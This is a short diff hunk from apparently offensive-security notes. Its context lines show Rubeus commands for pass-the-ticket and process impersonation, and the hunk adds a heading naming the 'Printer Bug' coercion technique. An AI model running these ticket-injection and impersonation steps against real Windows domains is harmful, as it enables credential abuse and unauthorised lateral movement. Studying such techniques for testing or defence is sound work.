@@ -219,6 +219,8 @@ Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
 Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
 ImpersonateProcess 2768
 
+The "Printer Bug"
+
 
 
 
